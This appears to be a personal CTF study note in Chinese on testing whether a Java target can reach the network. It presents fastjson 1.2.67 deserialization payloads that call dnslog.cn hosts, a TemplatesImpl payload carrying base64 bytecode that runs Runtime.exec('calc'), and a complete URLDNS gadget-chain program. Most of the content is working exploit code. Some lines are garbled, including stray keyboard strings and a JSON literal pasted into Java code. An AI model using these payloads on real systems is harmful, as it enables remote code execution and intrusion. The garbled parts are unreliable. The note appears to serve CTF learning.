## 基于做题的时候不太会判断出不出网，所以这篇文章对一些场景做一个分析

### `如果题目是fastjson环境`

```java
 <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.67</version>
        </dependency>
```

```java
payload1="{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"https://2xwxme.dnslog.cn\"}}\"\"}\n";
payload1="{{\"@type\":\"java.net.URL\",\"val\":\"https://a5m0vh.dnslog.cn\"}:0";
payload1=" {{\"@type\":\"java.net.URL\",\"val\":\"https://2xwxme.dnslog.cn\n\"}:\"x\"}";
payload1="Set[{\"@type\":\"java.net.URL\",\"val\":\"https://54i5v6.dnslog.cn\"}]";
```

其实上面的类也就一个就是，java.net.URL这个类，其他都是绕过方式,但是需要多尝试几次有的时候发包发不过去。

可以打ddfsfsfsfsdfd

```java
package fanshe;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;

public class fast {
    public static void main(String[] args) {

        String payload1 ="{\"a\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAGAEABUhlbGxvBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEABjxpbml0PgEAAygpVgEABENvZGUMAAUABgoABAAIAQARamF2YS9sYW5nL1J1bnRpbWUHAAoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAMAA0KAAsADgEABGNhbGMIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhACEAAgAEAAAAAAABAAEABQAGAAEABwAAABoAAgABAAAADiq3AAm4AA8SEbYAFVexAAAAAAABABYAAAACABc=\"],'_name':'asd','_tfactory':{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\",\"autoCommit\": true}}";



        payload1=" {{\"@type\":\"java.net.URL\",\"val\":\"https://2xwxme.dnslog.cn\n\"}:\"x\"}";
{"@type":"java.net.Inet4Address","val":"dnslog"}

        System.out.println(payload1);
        JSONObject obj = JSON.parseObject(payload1, Feature.SupportNonPublicField);
        System.out.println(obj);

    }
}
可以直接
```

![image-20231022161007248](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231022161007248.png)

![image-20231022161102582](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231022161102582.png)

### 如果是直接给了一个readObject环境，如何测试是否出网

第一反应肯定是通过urldns链子来尝d fd 

```java
package fanshe;

import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;


public class URLDNS {
    public static String string;
    public static void main(String[] args) throws Exception {

        //漏洞出发点 hashmap，实例化出来
        HashMap<URL, String> hashMap = new HashMap<URL, String>();

        //URL对象传入自己测试的dnslog
        URL url = new URL("https://ebdm0h.dnslog.cn");
        //反射获取 URL的hashcode方法
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        //使用内部方法
        f.setAccessible(true);
        // put 一个值的时候就不会去查询 DNS，避免和刚刚混淆
        f.set(url, 0xdeadbeef);
        hashMap.put(url, "zeo");
        // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode
        f.set(url, -1);
        //序列化成对象，输出出来
//        ObjectOutputStream objos = new ObjectOutputStream(new FileOutputStream("./out.bin"));
//        objos.writeObject(hashMap);
        serialize(hashMap);
        System.out.println(string.length());
        unserialize();
    }
    public static void serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static void unserialize() throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
```

